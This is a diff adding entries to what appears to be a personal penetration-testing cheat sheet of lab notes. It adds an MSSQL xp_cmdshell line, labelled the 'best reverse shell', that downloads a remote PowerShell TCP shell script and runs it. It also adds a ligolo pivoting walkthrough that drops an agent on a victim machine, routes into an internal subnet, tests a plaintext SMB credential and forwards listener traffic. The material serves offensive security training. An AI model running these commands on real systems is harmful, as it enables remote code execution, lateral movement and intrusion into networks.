@@ -14,6 +14,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [ligolo](#ligolo)
   - [netcat](#netcat)
   - [tcpdump](#tcpdump)
   - [cmd](#cmd)
@@ -655,6 +656,10 @@ select * from offsec.dbo.users;
 > xp_dirtree \\10.10.14.83\share\dir
 > xp_dirtree c:\
 > xp_dirtree c:\inetpub\wwwroot
+
+
+# Best reverse shell!!!
+xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(''http://10.10.210.147:9900/Invoke-PowerShellTcp.ps1'')"
 ```
 
 ## sqlite
@@ -749,6 +754,41 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### ligolo
+```bash
+# on kali machine
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+
+# on victim machine
+iwr -uri http://192.168.45.202/agent.exe -outfile agent.exe
+.\agent.exe -connect 192.168.45.202:11601 -ignore-cert
+
+# back on kali(ligolo)
+# first type session
+session
+# and type 1(or what you want to use)
+1
+# check network interface
+ifconfig
+
+# let's add routing table( on a new tab)
+sudo ip route add 10.10.210.0/24 dev ligolo
+# confirm if it's added
+ip route list
+
+# now back to ligolo(kali)
+# make sure we're on the right session by typing session 1
+start
+
+# check if it's working with netexec
+netexec smb 10.10.210.148 -u web_svc -p Diamond1
+
+# add listener (so the internal machine will shoot the connection through this port)
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
+```
+
 ### netcat
 ```bash
 # file transfer
